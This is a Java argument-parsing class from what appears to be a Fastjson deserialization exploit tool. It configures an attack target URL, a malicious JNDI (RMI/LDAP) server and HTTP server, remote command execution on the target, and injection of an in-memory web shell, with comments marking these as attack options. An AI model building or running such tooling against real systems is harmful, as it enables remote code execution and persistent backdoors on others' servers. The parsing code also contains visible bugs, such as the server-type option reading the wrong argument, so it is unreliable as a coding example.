package com.fastjsontool.exploit.Utils;

import com.fastjsontool.exploit.Info;
import org.apache.commons.cli.*;

public class ParamUtils {

    /**
     * 处理传递的参数
     * @param args
     */
    public static void paramsHandle(String[] args){
        int i=0;
        StringBuilder stringBuilder = new StringBuilder();
        String current="";
        String param="";
        while (i<=args.length){
            try {
                param=args[i];
            }catch (Exception e){
                param="-";
            }
            if(param.startsWith("-")){
                if (stringBuilder.length()>0){
                    String s=stringBuilder.toString();
                    if(current.equals("-i")) {   //攻击目标
                        Info.url=s;
                    }
                    if(current.equals("-h")){  //http服务地址
                        if(IPUtils.isIPAddress(s)){
                            Info.ipaddr=s;
                        }else {
                            System.out.println("IP地址输入错误");
                            System.exit(0);
                        }
                    }
                    if(current.equals("-hp")){
                        int httpPort = Integer.parseInt(s);
                        if(httpPort<65535 && 0<httpPort){
                            Info.httpPort=httpPort;
                        }else{
                            System.out.println("HTTP服务端口输入错误");
                            System.exit(0);
                        }
                    }
                    if(current.equals("-s")){
                        if(s.equals("rmi") || s.equals("ldap")){
                            Info.type=s;
                        }else {
                            Info.type="ldap";
                        }
                    }
                    if(current.equals("-sp")){
                        int Port = Integer.parseInt(s);
                        if(Port<65535 && 0<Port && Port != Info.httpPort){
                            Info.port=Port;
                        }else{
                            System.out.println("JNDI服务端口输入错误");
                            System.exit(0);
                        }
                    }
                    if(current.equals("-e")){  //执行命令
                        Info.cmd="cmd";
                        Info.cmd_=s;
                    }
                    if(current.equals("-m")){   //直接注入内存马
                        if(s.equals("shell")) {
                            Info.cmd = "shell";
                        }
                    }
                    if(current.equals("-p")){
                        if(!s.equals("")){
                            Info.pause=true;
                        }
                    }
                    stringBuilder.delete(0,stringBuilder.length());
                    current="";
                }
                if(current.equals("")){
                    try {
                        current=args[i];
                    }catch (Exception e){
                        current="";
                    }

                }
                i+=1;
            }else{
                stringBuilder.append(args[i]);
                i+=1;
            }
        }
    }

    public static void parseCommandLine(String[] args) {
        Options options = new Options();
        Option helpOption = new Option("H", "help", false, "print help.");
        options.addOption(helpOption);

        Option httpOption = new Option("h", "host", true, "http服务地址");
        options.addOption(httpOption);
        Option httpPortPortOption = new Option("hp", "http_port", false, "http服务端口");
        options.addOption(httpPortPortOption);

        Option jndiPortOption = new Option("s", "server", false, "JNDI服务类型，默认ldap");
        options.addOption(jndiPortOption);
        Option jndiPortPortOption = new Option("sp", "serverPort", false, "JNDI服务端口");
        options.addOption(jndiPortPortOption);

        Option execPortOption = new Option("e", "exec", false, "命令执行");
        options.addOption(execPortOption);
        Option memoryPortOption = new Option("m", "memory", false, "注入内存马");
        options.addOption(memoryPortOption);

        Option pausePortOption = new Option("p", "pause", false, "程序运行结束挂起服务！！！");
        options.addOption(pausePortOption);

        CommandLine commandLine = null;
        try {
            CommandLineParser parser = new DefaultParser();
            commandLine = parser.parse(options, args);
            if (commandLine.hasOption("H")) {
                HelpFormatter hf = new HelpFormatter();
                String formatstr = "java -jar fastjson_exploit.jar -h 0.0.0.0 [-hp 8090] [-s ldap] [-sp 1389] -e whoami [-m memory] -p pause";
                hf.printHelp(formatstr, "", options, "");
                System.exit(1);
            }
            if (commandLine.hasOption("h")) {
                Info.ipaddr = commandLine.getOptionValue("h");
            }
            if (commandLine.hasOption("hp")) {
                Info.httpPort = Integer.parseInt(commandLine.getOptionValue("hp"));
            }
            if (commandLine.hasOption("s")) {
                Info.type = commandLine.getOptionValue("sp");
            }
            if (commandLine.hasOption("sp")) {
                Info.port = Integer.parseInt(commandLine.getOptionValue("sp"));
            }

            if (commandLine.hasOption("e")) {
                Info.cmd = "cmd";
                Info.cmd_ = commandLine.getOptionValue("e");
            }
            if (commandLine.hasOption("m")) {
                Info.cmd = "shell";
            }
            if (commandLine.hasOption("p")) {
                Info.pause = true;
            }
        } catch (Exception e) {
            System.err.println("CommandLine parse failed.");
            System.err.println(e.getMessage());
            System.exit(1);
        }
    }
}
